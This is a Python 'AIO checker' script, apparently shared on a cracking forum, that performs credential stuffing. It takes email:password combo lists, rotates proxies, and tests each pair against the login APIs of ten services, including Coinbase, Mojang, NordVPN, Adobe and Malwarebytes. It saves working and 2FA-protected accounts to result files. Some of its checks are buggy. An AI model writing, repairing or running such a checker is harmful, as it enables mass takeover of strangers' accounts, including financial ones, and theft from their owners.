import os
from os import system, name

import json
try:
  import requests
except:
  system('pip install requests')
  import requests
try:
  import random
except :  
  system('pip install random')
  import random
try:
  import time
  from time import sleep
except :
  system('pip install time')
  import time
  from time import sleep
try :
  with open("config.json") as config:
    config = json.load(config)
    log = config["log"]
    deletecombo=config["deletecombo"]
except:
  print('Download the Config in https://raw.githubusercontent.com/bearbearteam/python-aio/main/config.json ! ')
  time.sleep(5)
  exit()
def clear():
  
    # for windows
    if name == 'nt':
        _ = system('cls')
  
    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')
def save():
  with open('config.json', 'w+') as f:
    json.dump(config, f)
class counter:
  invalid = 0
  hits = 0
  free = 0
  free2fa = 0
def loadcounter():
  hits = str(counter.hits)
  invalid = str(counter.invalid)
  free = str(counter.free)
  free2fa = str(counter.free2fa)
  clear()
  print('          Aio Status')
  print('          Hits : '+hits)
  print('          Invalids : '+invalid)
  print('          Free : '+free)
  print('          2fa : '+free2fa)
clear()



def Funimation(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'okhttp/3.12.1',
          
      }
  )
  url = 'https://prod-api-funimationnow.dadcdigital.com/api/auth/login/'
  data ={"email":x,"password":y}

  r = requests.post(url, json=data,headers=headers)
  if 'Failed Authentication' or 'false' in r.text:
    status = 'false'
  elif 'token' in r.text:
    status = 'true'
  elif r.status_code ==429:
    status = 'false'

  return status
def supercell(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
          
      }
  )
  url = 'https://mvfldg522i.execute-api.us-east-1.amazonaws.com/production/customers/login'
  data ={"email":x}

  r = requests.post(url, json=data,headers=headers)
  if 'Bad request' in r.text:
    status = 'false'
  elif '{}' in r.text:
    status = 'true'
  elif r.status_code ==429:
    status = 'false'
  else :
    status = 'false'
  return status
def minecraft(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
          
      }
  )
  url = 'https://authserver.mojang.com/authenticate'
  data ={"captcha":"","captchaSupported":"","password":y,"requestUser":"true","username":x}

  r = requests.post(url, json=data,headers=headers)
  if 'error' in r.text:
    status = 'false'
  elif 'accessToken' in r.text:
    status = 'true'
  elif r.status_code ==429:
    status = 'false'
  else :
    status = 'false'
  return status
def adobevm(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
          'X-IMS-CLIENTID': 'ngl_acrobat_reader1',
      }
  )
  url = 'https://auth.services.adobe.com/signin/v2/users/accounts'
  data ={"username":x}

  r = requests.post(url, json=data,headers=headers)
  if '[]' in r.text:
    status = 'false'
  elif 'id' in r.text:
    status = 'true'
  elif r.status_code ==429:
    status = 'false'
  else :
    status = 'false'
  return status
def malwarebytes(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'MBAM/4.4.10.144 (build: 1.0.1499; Windows 10.0.19043)',
      }
  )
  url = 'https://my-sso.malwarebytes.com/auth'
  data ={"email": x, "password": y, "generate_holocron_token": 'true'}

  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if '"success":false' in r.text:
    status = 'false'
  elif '"success":true' in r.text:
    status = 'true'
  else :
    status = 'false'
  return status
def coinbase(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'CoinbasePro/1.0.85 (com.coinbase.pro; build:1008501; iOS 15.0)',
      }
  )
  url = 'https://api.coinbase.com/oauth/authorize/with-credentials'
  data ={"client_id":"2d06b9a69c15e183856ff52c250281f6d93f9abef819921eac0d8647bb2b61f9","password":y,"username":x}

  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'param_required' or 'incorrect_credentials' in r.text:
    status = 'false'
  elif 'success' in r.text:
    status = 'true'
  elif '2fa_required' in r.text:
    status = '2fa'
  else :
    status = 'false'
  return status
def picstart(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
      }
  )
  url = 'https://api.picsart.com/users/signin.json'
  data = {"email":x,"password":y,"provider":"picsart"}
  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'incorrect' in r.text:
    status = 'false'
  elif 'success' in r.text:
    status = 'true'
  else :
    status = 'false'
  return status
def curiositystream(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
      }
  )
  url = 'https://api.curiositystream.com/v1/login/'
  data = {"email":x,"password":y}
  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'error' in r.text:
    status = 'false'
  elif 'success' in r.text:
    status = 'true'
  else :
    status = 'false'
  return status
def nordvpn(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()
  headers.update(
      {
          'User-Agent': 'NordApp iOS (applestore/5.0.5) iOS/13.3.1',
      }
  )
  url = "https://zwyr157wwiu6eior.com/v1/users/tokens" 
  data = "password="+x+"&username="+y
  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'Invalid username' in r.text:
    status = 'false'
  elif 'token' in r.text:
    status = 'true'
  else :
    status = 'false'
  return status
def geoguessr(combo,proxy):
  
  x,y = combo.split(":", 1)
  headers = requests.utils.default_headers()

  headers.update(
      {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
      }
  )
  url = 'https://www.geoguessr.com/api/v3/accounts/signin'
  email = x
  password = y
  data = {"email":email,"password":password}
  r = requests.post(url, json=data, proxies=proxy,headers=headers)
  if 'Hmm' in r.text:
    status = 'false'
  if 'created' in r.text:
    status = 'true'
  else:
    status = 'false'
  return status
def proxy_loader(proxyfile):
  lines = open(proxyfile).read().splitlines()
  proxy =random.choice(lines)
  proxies = {"http": proxy}
  return proxies

def combo_loader():
  print('\nModules:\n1 : GeoGussr\n2 : Curiosity Stream\n3 : NordVPN\n4 : Picstart\n5 : Coinbase\n6 : malwarebytes\n7 : Adobe VM\n8 : Minecraft\n9 : SuperCell VM\n10 : Funimation\nS : Settings')
  module = input('Please input module number : ')

  if module == 'S':
    print('Settings Page')
    settingsmodule = input('1 : Log hits\n2 : Delete Combo File after checking\n->')
    if settingsmodule== '1':
      print('Do you want to log hits(print out)')
      logging = input('1 : yes\n2 : no\n-> ')
      config["log"] = logging
    if settingsmodule == '2':
      print('Do you want to delete combo file after checcking')
      logging = input('1 : yes\n2 : no\n-> ')
      config["deletecombo"] = logging     
    print('Logging down your awnser,closing window after done! ')
    save()
    time.sleep(5)
  
    exit()
  file = input(('Please input your combo file : '))
  file2 = input(('Please input your proxy file(Only Http) : '))

  try:
    f = open(file2,"r")
    f = open(file, "r")
  except:
    exit()
  f = open(file, "r")
  for x in f:
    proxyoutput = proxy_loader(file2)
    if module == '1':
      output = geoguessr(x,proxyoutput)
    elif module == '2':
      output = curiositystream(x,proxyoutput)
    elif module == '3':
      output = nordvpn(x,proxyoutput)
    elif module == '4':
      output = picstart(x,proxyoutput)
    elif module == '5':
      output = coinbase(x,proxyoutput)
    elif module == '6':
      output = malwarebytes(x,proxyoutput)
    elif module == '7':
      output = adobevm(x,proxyoutput)
    elif module == '8':
      output = minecraft(x,proxyoutput)
    elif module == '9':
      output = supercell(x,proxyoutput)
    elif module == '10':
      output = Funimation(x,proxyoutput)
    else:
      print('Bruh,Chose a Valid module')
      time.sleep(10)
      quit()
    if output == 'true' :
      counter.hits +=1
      if log == "1":
        print('valid : '+ x ) 
      else:
        loadcounter()
      isdir = os.path.isdir('results')
      if isdir == False :
        os.mkdir('results')
      f = open('results/valid.txt','a+')
      accountwrite = (x+'\n')
      f.write(accountwrite)
    elif output == '2fa':
      counter.free2fa +=1

      if log == "1":
        print('2fa : '+ x ) 
      else:
        loadcounter()
      isdir = os.path.isdir('results')
      if isdir == False :
        os.mkdir('results')
      f = open('results/2fa.txt','a+')
      accountwrite = (x+'\n')
      f.write(accountwrite)
    elif output == 'false':
      counter.invalid +=1
      if log == "1":
        print('invalid : '+ x )
      else:
        loadcounter()
        
    else:
      print(output)
  return file
      


print('Welcome to AIO checker by cracked.to/lamlucius8')
sleep(5)


output = combo_loader()
if deletecombo == '1':
  os.remove(output)
  e = open('Nothing.txt','a+')
  pogchamp = ('Rep me on Cracked.io! cracked.io/lamlucius8 !!!!! ')
  e.write(pogchamp)

print('All valid accounts will be in results folder valid.txt')
sleep(15)
